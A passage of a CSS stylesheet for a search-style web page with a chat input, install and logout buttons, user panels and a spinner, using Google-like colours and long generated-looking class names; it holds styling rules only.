    overflow: hidden;
    position: relative;
    text-align: center;
    -webkit-tap-highlight-color: transparent;
    z-index: 0;
    text-decoration: none;
}

.input1
{
border-style:solid;
border-width:1px;
height:34px;
width:172px;
border-color:#aaaaaa;
font-size:16px;
padding-left:12px;
border-radius:2px;
}

.googleappsadsgoogleapps888844
{
background-color: #fff;
border-radius: 3px;
color: #006621;
display: inline-block;
font-size: 11px;
border: 1px solid #006621;
padding: 1px 3px 0 2px;
line-height: 11px;
vertical-align: baseline;
margin-right:4px;
}

img
{
padding-bottom:18px;
}

#googleappsinstallapps84
{
background-color:#4285f4;
border-style:solid;
border-width:1px;
border-radius:4px;
padding-top:8px;
padding-bottom:8px;
padding-left:18px;
padding-right:18px;
color:#ffffff;
right:18px;
-webkit-user-select: none;
-webkit-transition: background .2s .1s;
transition: background .2s .1s;
border: 0;
-webkit-border-radius: 3px;
border-radius: 3px;
cursor: pointer;
display: inline-block;
font-size: 14px;
font-weight: 500;
min-width: 4em;
outline: none;
overflow: hidden;
text-align: center;
text-transform: uppercase;
-webkit-tap-highlight-color: transparent;
z-index: 0;
display:none;
}

#input18
{
width:204px!important;
}

#input54
{
width:204px!important;
}

#inputapps84
{
width:204px!important;
}

.googlemobileapps18
{
background-color:#3B5998;
padding:8px;
color:#ffffff;
}

.googlemobileapps44
{
background-color:#55ACEE;
padding:8px;
color:#ffffff;
}

.googlemobileapps84
{
background-color:#dd4b39;
padding:8px;
color:#ffffff;
}

.installgoogleappsappsgoogleappsinstallapps
{
background-color:#f8f8f8;
color: rgba(0,0,0,.54);
font-family: Roboto-Medium,HelveticaNeue-Medium,HelveticaNeue,sans-serif-medium,Arial,sans-serif;
font-size:14px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
display:block;
}

.installgoogleappsappsgoogleappsinstallapps84
{
padding:16px!important;
padding-bottom:14px;
padding-left:16px!important;
}

.installgoogleappsappsgoogleappsinstallapps8432
{
background-color:#f8f8f8;
padding-left:0px!important;
}

.installgoogleappsappsinstallapps
{
background-color:#ffffff;
color:#222;
font-family: Roboto-Medium,HelveticaNeue-Medium,HelveticaNeue,sans-serif-medium,Arial,sans-serif;
font-size:14px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
}

.installgoogleappsappsinstallapps84
{
padding:16px!important;
padding-bottom:14px;
padding-left:16px!important;
}

.installgoogleappsappsinstallapps8432
{
background-color:#f8f8f8;
padding-left:0px!important;
}

.installgoogleappsappsinstallapps a
{
color:#222;
text-decoration:none;
}

.installgoogleappsappsinstallappsinstallapps a
{
color:#222;
text-decoration:none;
}

.installgoogleappsappsinstallappsinstallapps
{
background-color:#f8f8f8;
color: rgba(0,0,0,.54);
font-family: Roboto-Medium,HelveticaNeue-Medium,HelveticaNeue,sans-serif-medium,Arial,sans-serif;
font-size:14px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
display:block;
margin-bottom:8px;
background-color:#ffffff;
border-bottom-width:2px;
}

.installgoogleappsappsinstallappsinstallapps84
{
padding:16px!important;
padding-bottom:14px;
padding-left:16px!important;
}

.installgoogleappsappsinstallappsinstallapps8432
{
background-color:#f8f8f8;
padding-left:0px!important;
}

@media screen and (min-width: 960px)
{
mobileappsinstallapps84
{
background-color:#ffffff!important;
}
}

.googleapps448888
{
}

.installgoogleappsapps
{
}

.installgoogleappsapps84
{
background-color:#ffffff;
margin: 0px;
}

.installgoogleappsapps8432
{
padding-left: 24px;
padding-right: 16px;
padding-top: 0px;
padding-bottom: 0px;
background-color: #ffffff;
}

.installgoogleappsappsmobileapps
{
}
.installgoogleappsappsmobileapps84
{
}
.installgoogleappsappsmobileapps8432
{
padding-left: 24px;
padding-right: 16px;
padding-top: 0px;
padding-bottom: 0px;
background-color: #ffffff;
}
.installgoogleappsappsmobileapps a
{
}

.installgoogleappsappsgoogleapps
{
display:none;
}
.installgoogleappsappsgoogleapps84
{
}

.installgoogleappsappsgoogleapps8432
{
padding-left: 24px;
padding-right: 16px;
padding-top: 0px;
padding-bottom: 0px;
background-color: #ffffff;
}

@media screen and (max-width: 960px)
{
.installgoogleappsapps
{
background-color:#ffffff;
color:#222;
font-family: Roboto-Medium,HelveticaNeue-Medium,HelveticaNeue,sans-serif-medium,Arial,sans-serif;
font-size:14px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
}
.installgoogleappsapps84
{
padding:16px!important;
padding-bottom:14px;
padding-left:16px!important;
}
.installgoogleappsapps8432
{
padding-left:0px!important;
}
.installgoogleappsapps a
{
color:#222;
text-decoration:none;
}
.installgoogleappsappsgoogleapps
{
background-color:#f8f8f8;
color: rgba(0,0,0,.54);
font-family: Roboto-Medium,HelveticaNeue-Medium,HelveticaNeue,sans-serif-medium,Arial,sans-serif;
font-size:14px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
display:block;
}
.installgoogleappsappsgoogleapps84
{
padding:16px!important;
padding-bottom:14px;
padding-left:16px!important;
}
.installgoogleappsappsgoogleapps8432
{
background-color:#f8f8f8;
padding-left:0px!important;
}
.installgoogleappsappsmobileapps
{
background-color:#ffffff;
color:#222;
font-family: Roboto-Medium,HelveticaNeue-Medium,HelveticaNeue,sans-serif-medium,Arial,sans-serif;
font-size:14px;
border-style:solid;
border-width:1px;
border-top:none;
border-color:#dddddd;
border-bottom-width:2px;
}
.installgoogleappsappsmobileapps84
{
padding:16px!important;
padding-bottom:14px;
padding-left:16px!important;
}
.installgoogleappsappsmobileapps8432
{
padding-left:0px!important;
}
.installgoogleappsappsmobileapps a
{
color:#222;
text-decoration:none;
}
.installgoogleappsappsgoogleappsmobileapps
{
display:none
}
.installgoogleappsapps8432
{
padding-right:0px!important;
}
}

.installgoogleappsappsgoogleappsmobileapps8432
{
padding-left: 24px;
padding-right: 16px;
padding-top: 0px;
padding-bottom: 0px;
background-color: #ffffff;
font-size:1.17em;
color:#222222;
background-color:#ffffff;
}

.installgoogleappsappsgoogleappsmobileapps
{
background-color:#ffffff;
}

@media screen and (min-width: 960px)
{
.installgoogleappsappsmobileapps a
{
color:#1a0dab;
text-decoration:none;
line-height:26px;
font-size:14px;
font-weight:bold;
}
.installgoogleappsapps a
{
color:#1a0dab;
text-decoration:none;
line-height:26px;
font-size:14px;
font-weight:bold;
}
}

.installgoogleappsappsgoogleappsmobileapps
{
padding-bottom:18px;
}

.logout88888844
{
display:none;
}

@media screen and (min-width: 960px)
{
.logout88888844
{
display:none;
}
}

.googleappsusermobileapps84
{
display:none;
}

@media screen and (min-width: 960px)
{
.googleappsusermobileapps84
{
display:none;
}
}

.schema
{
display:none;
}

.brandname
{
font-weight:bold;
margin-left:8px;
cursor:pointer;
}

.googleapps8888441
{
color:#4285F4;
}

.googleapps8888442
{
color:#DB4437;
}

.googleapps8888443
{
color:#F4B400;
}

.googleapps8888444
{
color:#4285F4;
}

.googleapps8888445
{
color:#0F9D58;
}

.googleapps8888446
{
color:#DB4437;
}

.inputapps84747474444474
{
position:relative;
padding-bottom:0px;
}

.divappsmobileapps847474744474
{
position:absolute;
right:40px;
top:29.4px;
color:#4285F4;
}

.mobileinstallapps84444474
{
display:none;
}

.installgoogleapps84324474
{
margin-top:8px!important;
}

.mobileappsusernameapps8884
{
color:#333;
font-weight:bold;
}

.mobileappsusernameapps8884
{
padding:12px;
font-size:14px;
}

@media screen and (min-width: 960px)
{
.mobileappsusernameapps8884
{
display:none;
}
.logout88888844
{
display:none;
}
.inputapps84747474444474
{
padding-top:2px;
}
}

.footer
{
margin-top:8px;
}

.logout88888844
{
color:#828282;
font-size:12.8px;
text-decoration:none;
padding:12px;
position:absolute;
}

.googleappsusermobileapps84
{
margin-left:18px;
color:#828282;
font-size:12.8px;
text-decoration:none;
position:absolute;
left:108px;
top:13.4px;
}

@media screen and (min-width: 960px)
{
.googleappsusermobileapps84
{
display:none;
}
}

html
{
margin-left:0%;
margin:0px;
font-family: Varela Round, sans-serif;
background-color:#ffffff;
}

#input84
{
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
width:644px;
height:44px;
padding-left:16px;
border:none;
background-color:#ffffff;
color:#000000;
margin-top:18px;
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
vertical-align:top;
border-radius:2px;
box-shadow:0 2px 2px 0 rgba(0,0,0,0.16),0 0 0 1px rgba(0,0,0,0.08);
transition:box-shadow 200ms cubic-bezier(0.4, 0.0, 0.2, 1);
}

#chatbox
{
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
width:644px;
height:44px;
padding-left:16px;
border:none;
background-color:#ffffff;
color:#000000;
margin-top:18px;
box-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
vertical-align:top;
border-radius:2px;
box-shadow:0 2px 2px 0 rgba(0,0,0,0.16),0 0 0 1px rgba(0,0,0,0.08);
transition:box-shadow 200ms cubic-bezier(0.4, 0.0, 0.2, 1);
}

#input84:hover
{
box-shadow: 0 3px 8px 0 rgba(0,0,0,0.2),0 0 0 1px rgba(0,0,0,0.08);
}

#chatbox:hover
{
box-shadow: 0 3px 8px 0 rgba(0,0,0,0.2),0 0 0 1px rgba(0,0,0,0.08);
}

#input84[type="text"]
{
font-size:16px;
}

#chatbox[type="text"]
{
font-size:16px;
}

.brandname84
{
font-size:26px;
margin-top:108px;
font-size:52px;
}

@media screen and (max-width: 960px)
{
#input84
{
width:100%;
}
#chatbox
{
width:100%;
}
.brandname84
{
margin-top:108px;
}
}

@media screen and (min-width: 960px)
{
.brandname84
{
margin-top:266px;
}
}

input[type="text"] {
background-position:right 6px;
background-repeat:no-repeat;
}

.googleappsimg84
{
display:none;
}

.googleappsinstallappsimg84
{
display:none;
}

.divapps84
{
display:none;
}

.divappsmobileapps84
{
display:none;
}

.divappsmobileapps8884
{
display:none;
}

.googleapps888844
{
color:#4285f4;
}

.googleapps88888844
{
color:#4285f4;
}

.dropbtngoogleapps84
{
outline:none!important;
}

.center
{
text-align:center;
}

.googleappsbuywebsitescriptapps84
{
display:none;
}

.googleappsbuywebsitescriptapps84
{
position:fixed;
width:100%;
background-color:#dddddd;
bottom:0px;
left:0px;
padding:12px;
}

.divapps84 {
  box-sizing: border-box
}
.divappsmobileapps84 {
  box-shadow: inset 0 0 3px 0px #484848, 0 0 6px 0px #484848;
  width: 18px;
  height: 18px;
  margin: 0 auto;
  border-radius: 50%;
  border-top: 4px solid #2E7D32;
  border-right: 4px solid #EF6C00;
  border-bottom: 4px solid #EF6C00;
  border-left: 4px solid #2E7D32;
  transform: rotate(54deg);
  position: relative;
  position:absolute;
  left:740px;
  top:30px;
  display:none;
}
.divappsmobileapps84:before, .divappsmobileapps84:after {
  content: "";
  position: absolute;
  left: -4px;
  top: -4px;
  width: 100%;
  height: 100%;
  border-radius: 50%;
}

.divappsmobileapps84:before {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(60deg)
}
.divappsmobileapps84:after {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(30deg)
}

@media screen and (max-width: 960px)
{
.divappsmobileapps84
{
display:none;
}
.divapps84 {
  box-sizing: border-box
}
.divappsmobileapps8884 {
  box-shadow: inset 0 0 3px 0px #484848, 0 0 6px 0px #484848;
  width: 18px;
  height: 18px;
  margin: 0 auto;
  border-radius: 50%;
  border-top: 4px solid #2E7D32;
  border-right: 4px solid #EF6C00;
  border-bottom: 4px solid #EF6C00;
  border-left: 4px solid #2E7D32;
  transform: rotate(54deg);
  position: relative;
  position:absolute;
  right:22px;
  top:72px;
  display:none;
}
.divappsmobileapps8884:before, .divappsmobileapps8884:after {
  content: "";
  position: absolute;
  left: -4px;
  top: -4px;
  width: 100%;
  height: 100%;
  border-radius: 50%;
}

.divappsmobileapps8884:before {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(60deg)
}
.divappsmobileapps8884:after {
  border-top: 4px solid #F9A825;
  border-right: 4px solid transparent;
  border-bottom: 4px solid transparent;
  border-left: 4px solid transparent;
  transform: rotate(30deg)
}
}

.googleappsbuywebsitescriptapps84
{
display:none;
}

.schema
{
display:none;
}

.brandname84
{
cursor:pointer;
}

.googleappsadsapps84
{
position:absolute;
bottom:0px;
left:0px;
width:100%;
background-color:#dddddd;
color:#222222;
text-decoration:none;
}

.googleappsadsapps8884
{
padding:12px;
}

.business
{
color:#222222;
text-decoration:none;
}

.about
{
color:#222222;
text-decoration:none;
}

.circleBase {
border-radius: 50%;
behavior: url(PIE.htc); /* remove if you don't care about IE8 */
}

.type1 {
width: 34px;
height: 34px;
background: #1565C0;
border: 2px solid #dddddd;
}
.type2 {
width: 50px;
height: 50px;
background: #ccc;
border: 3px solid #000;
}
.type3 {
width: 500px;
height: 500px;
background: aqua;
border: 30px solid blue;
}

.username84
{
margin-left: 10px;
padding-top: 9px;
color: #ffffff;
}

.username8884
{
margin-left: 10px;
padding-top: 9px;
color: #ffffff;
margin-left: 30px;
padding-top: 26px;
font-size: 34px;
}

@media screen and (max-width: 960px)
{
.circleBase
{
display:none;
}
}

#googleapps8884
{
position:absolute;
right:44px;
top:74px;
background-color:#ffffff;
height:208px;
width:308px;
right:26px;
z-index:4;
box-shadow:0 2px 10px rgba(0,0,0,.2);
border: 1px solid #ccc;
}

.circleBase84 {
border-radius: 50%;
behavior: url(PIE.htc); /* remove if you don't care about IE8 */
margin:24px;
}

.type84 {
width: 96px;
height: 96px;
background: #1565C0;
border: 2px solid #dddddd;
}
.type2 {
width: 50px;
height: 50px;
background: #ccc;
border: 3px solid #000;
}
.type3 {
width: 500px;
height: 500px;
background: aqua;
border: 30px solid blue;
}

.googleappsuserapps8884
{
position:absolute;
top:24px;
left:138px;
font-weight:bold;
font-size:small;
}

.logout84
{
border: 1px solid #c6c6c6;
border-radius: 2px;
font-family: arial,sans-serif;
font-size: small;
background-color: #f8f8f8;
color: #666666;
width: 74px;
text-decoration: none;
text-align: center;
height:22px;
padding-top:6px;
}

.googleappsuserapps88888844
{
width: 100%;
border-style: solid;
position: absolute;
bottom: 0px;
height: 62px;
border-width: 1px;
border-bottom: none;
border-left: none;
border-right: none;
border-color: #cccccc;
background-color:#f8f8f8;
}

.logout84
{
display:none;
}

.circleBase
{
display:none;
}

@media screen and (min-width: 960px)
{
.logout84
{
display:none;
}
}

.logout8884
{
background-color: #4285f4;
border-style: solid;
border-width: 1px;
border-radius: 4px;
padding-top: 8px;
padding-bottom: 8px;
padding-left: 18px;
padding-right: 18px;
margin-left: -40px;
margin-top:0px;
color: #ffffff;
position: absolute;
left:0px;
-webkit-user-select: none;
-webkit-transition: background .2s .1s;
transition: background .2s .1s;
border: 0;
-webkit-border-radius: 3px;
border-radius: 3px;
cursor: pointer;
display: inline-block;
font-size:small;
font-weight:bold;
min-width: 4em;
outline: none;
overflow: hidden;
position: relative;
text-align: center;
-webkit-tap-highlight-color: transparent;
z-index: 0;
text-decoration:none;
}

.signup84
{
position:absolute;
top:24px;
right:24px;
}

#googleapps8884
{
display:none;
}

.logout84
{
position:absolute;
bottom:18px;
right:18px;
}

.paypal
{
display:none;
}

.mobile1
{
position:fixed;
padding:12px;
width:100%;
bottom:0px;
left:0px;
background-color:#f1f1f1;
}

.mobile2
{
display:flex;
}

.mobile3
{
background-color:#4285f4;
display:inline-block;
padding:12px;
color:#ffffff;
cursor:pointer;
}

.mobile4
{
background-color:#444444;
display:inline-block;
padding:12px;
color:#ffffff;
margin-left:12px;
}

.mobile5
{
padding-top:12px;
}

</style>

